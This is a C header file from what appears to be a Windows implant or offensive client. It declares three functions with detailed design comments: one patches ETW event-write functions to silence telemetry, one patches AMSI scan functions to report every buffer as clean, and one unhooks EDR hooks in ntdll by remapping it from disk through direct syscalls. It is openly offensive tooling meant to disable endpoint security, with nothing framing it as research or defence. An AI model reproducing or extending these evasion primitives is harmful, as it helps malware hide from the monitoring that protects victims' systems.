/*
 * client/evasion.h  –  User-mode evasion primitives
 * ==================================================
 *
 *  etw_patch()
 *      Patches EtwEventWrite, EtwEventWriteFull, EtwEventWriteEx, and
 *      EtwEventWriteTransfer in the in-process ntdll copy with a 3-byte
 *      xor-eax/ret stub (STATUS_SUCCESS).  Silences all four user-mode ETW
 *      write entry-points so process telemetry cannot reach EDR/WEF/Defender.
 *      NOTE: ETW-Ti (kernel-mode Threat Intelligence provider) is unaffected —
 *      that channel is fed by ntoskrnl and cannot be silenced from user mode.
 *
 *  amsi_patch()
 *      Patches AmsiScanBuffer AND AmsiScanString in amsi.dll with stubs that
 *      set *result = AMSI_RESULT_CLEAN (1) and return S_OK.  Silences both
 *      the buffer and string scan entry-points used by PS/WSH/CLR AMSI
 *      providers.  No-op if amsi.dll is not already loaded (safe; means no
 *      AMSI provider is active).  Does NOT force-load amsi.dll — that would
 *      trigger LdrRegisterDllNotification callbacks before the patch lands.
 *
 *  unhook_ntdll()
 *      Remaps ntdll.dll from disk over the live in-process copy, restoring
 *      EDR hooks in three layers:
 *        1. Inline JMP hooks in .text (syscall stubs)
 *        2. Read-write data patches in .data
 *        3. EAT (Export Address Table) redirects — restored entry-by-entry
 *      File + section operations use SC_NtOpenFile / SC_NtCreateSection /
 *      SC_NtMapViewOfSection direct syscalls — no CreateFileW or
 *      CreateFileMappingW in the IAT call sequence.
 */

#pragma once
#ifndef CLIENT_EVASION_H
#define CLIENT_EVASION_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Patch EtwEventWrite → ret.  Call once at startup. */
void etw_patch(void);

/* Patch AmsiScanBuffer → AMSI_RESULT_CLEAN.  Call once at startup. */
void amsi_patch(void);

/*
 * Remap ntdll.dll .text + .data from disk and restore the EAT,
 * overwriting all EDR inline hooks and EAT-redirect hooks.
 * File/section operations use SC_NtOpenFile / SC_NtCreateSection /
 * SC_NtMapViewOfSection — no Win32 file API in the IAT call sequence.
 * Call once at startup, before inject_init() resolves NT pointers.
 */
void unhook_ntdll(void);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_EVASION_H */
